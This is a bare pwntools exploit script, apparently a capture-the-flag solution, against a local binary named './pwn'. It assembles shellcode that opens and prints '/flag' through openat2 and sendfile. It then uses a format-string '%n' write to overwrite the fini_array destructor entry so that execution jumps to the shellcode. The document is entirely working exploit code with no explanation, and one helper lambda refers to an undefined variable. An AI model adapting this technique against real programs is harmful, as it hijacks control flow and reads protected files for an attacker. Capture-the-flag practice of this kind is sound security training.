from pwn import *
context(os='linux', arch='amd64' , log_level='debug')

procname = './pwn'
libcname = './libc.so.6'

# io = process(procname, stdin=PTY)
io = remote('localhost', 36479)
elf = ELF(procname)
# libc = ELF(libcname)

n2b = lambda x    : str(x).encode()
rv  = lambda x    : io.recv(x)
ru  = lambda s    : io.recvuntil(s, drop=True)
sd  = lambda s    : io.send(s)
sl  = lambda s    : io.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda p, s : io.sendafter(p, s)
sla = lambda p, s : io.sendlineafter(p, s)
sna = lambda p, n : sla(p, n2b(n))
ia  = lambda      : io.interactive()
rop = lambda r    : flat([p64(x) for x in r])

pause()

shellcode  = shellcraft.push(1) + shellcraft.push(0) + shellcraft.push(0)
shellcode += '''
    push rsp
    pop rdx
'''
shellcode += shellcraft.pushstr('/flag')
shellcode += shellcraft.syscall('SYS_openat2', 0, 'rsp', 'rdx', 0x18)
shellcode += shellcraft.sendfile(1, 3, 0, 0x50)


payload = asm(shellcode)

target_number = elf.bss(0x40 + len(payload) + 0x17) - elf.sym.__do_global_dtors_aux_fini_array_entry
payload += f'%{target_number - len(payload)}c%35$n'.encode().ljust(0x17)
payload += p64(0x10000)

sl(payload)

ia()
